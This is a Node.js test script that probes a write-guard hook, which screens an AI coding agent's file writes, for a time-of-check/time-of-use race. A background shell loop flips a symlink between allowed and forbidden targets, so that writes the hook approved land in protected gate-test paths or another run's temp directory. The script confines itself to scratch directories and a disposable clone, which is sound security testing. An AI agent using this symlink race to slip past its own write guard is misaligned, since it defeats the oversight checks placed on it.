// Write-guard time-of-check/time-of-use probe (code-security-reviewer, DG0 round 15).
// The guard is a PreToolUse hook: a separate process decides on the path, and the Claude Code CLI writes afterwards.
// A sandboxed agent shell can keep a background loop that flips a symlink in its own $TMPDIR between a benign target
// and a forbidden one. This script measures how often "hook says allow, then the write lands in the forbidden place".
// Everything stays inside this run's own scratch: MTH_RUN_TMP is set to <scratch>/runA (the "attacker's" private TMPDIR)
// and the forbidden targets are <scratch>/runB (standing in for ANOTHER run's private TMPDIR) and a protected path
// (tools/gates/tests) inside a disposable clone that serves as the guarded repository.
//   usage: node repro-r15-guard-toctou.mjs <disposable-clone> <scratch-dir> [attempts]
import { spawn, spawnSync } from "node:child_process";
import { mkdirSync, existsSync, readdirSync, writeFileSync, rmSync } from "node:fs";
import { join } from "node:path";
const [clone, scratch, n = "200"] = process.argv.slice(2);
const N = Number(n);
const runA = join(scratch, "runA"), runB = join(scratch, "runB");
rmSync(runA, { recursive: true, force: true }); rmSync(runB, { recursive: true, force: true });
mkdirSync(join(runA, "benign"), { recursive: true }); mkdirSync(join(runB, "clone", "tools", "gates", "tests"), { recursive: true });
const guard = join(clone, "tools/agents/guard-write.mjs");
const env = { ...process.env, MTH_GUARD_ROOT: clone, MTH_RUN_TMP: runA, TMPDIR: runA };

function hook(role, filePath) { // exactly what the CLI does: run the hook command with the JSON payload on stdin
  const r = spawnSync("node", [guard, role], { input: JSON.stringify({ tool_name: "Write", tool_input: { file_path: filePath, content: "x" } }), env });
  return { rc: r.status, err: r.stderr.toString().trim() };
}

async function scenario(label, role, forbiddenDir) {
  const flip = join(runA, "flip");
  // Static control: the forbidden link alone must be blocked.
  spawnSync("ln", ["-sfn", forbiddenDir, flip]);
  const stat = hook(role, join(flip, "static.txt"));
  console.log(`[${label}] static check, flip -> forbidden: hook rc=${stat.rc} ${stat.err}`);
  // Flipper: the agent's background shell loop (atomic rename of a fresh symlink each time).
  const flipper = spawn("bash", ["-c", `cd '${runA}'; while :; do ln -sfn '${join(runA, "benign")}' .t1 && mv -Tf .t1 flip; ln -sfn '${forbiddenDir}' .t2 && mv -Tf .t2 flip; done`], { stdio: "ignore" });
  await new Promise((r) => setTimeout(r, 200));
  let allowed = 0, landedForbidden = 0, blocked = 0;
  for (let i = 0; i < N; i++) {
    const p = join(flip, `probe-${i}.txt`);
    const h = hook(role, p);
    if (h.rc !== 0) { blocked++; continue; }
    allowed++;
    try { writeFileSync(p, `written by attempt ${i}\n`); } catch { /* link momentarily absent */ }
  }
  flipper.kill("SIGKILL");
  landedForbidden = readdirSync(forbiddenDir).filter((f) => f.startsWith("probe-")).length;
  const landedBenign = readdirSync(join(runA, "benign")).filter((f) => f.startsWith("probe-")).length;
  console.log(`[${label}] role=${role} attempts=${N} hook-allowed=${allowed} hook-blocked=${blocked} landed-in-FORBIDDEN=${landedForbidden} landed-benign=${landedBenign}`);
  for (const f of readdirSync(forbiddenDir)) if (f.startsWith("probe-")) rmSync(join(forbiddenDir, f));
  for (const f of readdirSync(join(runA, "benign"))) rmSync(join(runA, "benign", f));
  rmSync(flip, { force: true });
  return landedForbidden;
}

console.log(`guard ${guard}; MTH_RUN_TMP=${runA}; ${new Date().toISOString()}`);
const a = await scenario("other run's private TMPDIR", "code-security-reviewer", join(runB, "clone", "tools", "gates", "tests"));
const b = await scenario("protected repo path tools/gates/tests", "backend-workflow-engineer", join(clone, "tools", "gates", "tests"));
const c = await scenario("protected repo path tools/gates/tests", "qa-verifier", join(clone, "tools", "gates", "tests"));
rmSync(runA, { recursive: true, force: true }); rmSync(runB, { recursive: true, force: true });
spawnSync("git", ["-C", clone, "checkout", "--", "."]); spawnSync("git", ["-C", clone, "clean", "-fdq", "tools/gates/tests"]);
console.log(`RESULT: forbidden writes after an allow verdict: ${a + b + c}`);
process.exit(a + b + c > 0 ? 1 : 0);
